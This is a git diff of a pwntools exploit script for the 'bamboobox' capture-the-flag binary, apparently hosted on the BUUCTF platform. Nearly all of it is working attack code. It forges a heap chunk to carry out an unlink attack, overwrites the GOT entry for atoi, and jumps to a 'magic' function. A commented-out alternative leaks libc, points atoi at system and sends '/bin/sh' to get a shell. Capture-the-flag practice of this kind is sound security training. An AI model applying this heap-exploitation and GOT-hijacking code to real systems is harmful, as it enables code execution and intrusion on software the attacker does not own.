@@ -28,13 +28,53 @@ uu64    = lambda data               :u64(data.ljust(8,'\0'))
 leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
 
 context.log_level = 'DEBUG'
-binary = './pwn'
+binary = './bamboobox'
 context.binary = binary
 elf = ELF(binary)
-p = remote('node3.buuoj.cn',29776) if argv[1]=='r' else process(binary)
-libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+p = remote('node3.buuoj.cn', 26500) if argv[1]=='r' else process(binary)
+# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
 
 # start
+def add(len,content='a'):
+	sla('choice:','2')
+	sla('name:',str(len))
+	sa('item:',content)
+def delete(index):
+	sla('choice:','4')
+	sla('item:',str(index))
+def edit(index,len,content):
+	sla('choice:','3')
+	sla('item:',str(index))
+	sla('name:',str(len))
+	sa('item:',content)
+def show():
+	sla('choice:','1')
+
+ptr = 0x6020c8
+add(0x80)
+add(0x80)
+add(0x80)
+fd = ptr-0x18
+bk = ptr-0x10
+payload = flat(0,0x81,fd,bk,'a'*0x60,0x80,0x90)
+edit(0,len(payload),payload)
+delete(1)
+
+# hijack to magic
+payload = flat(0,0,0,elf.got['atoi'])
+edit(0,len(payload),payload)
+edit(0,0x8,p64(elf.sym['magic']))
+sla('choice:','5')
+
+# OR hijack to system
+#payload = flat(0,0,0,elf.got['atoi'])
+#edit(0,len(payload),payload)
+#show()
+#ru('0 : ')
+#atoi = uu64(ru('2 :'))
+#system,binsh = ret2libc(atoi,'atoi')
+#edit(0,0x8,p64(system))
+#sla('choice:','/bin/sh\x00')
 
 # end
 
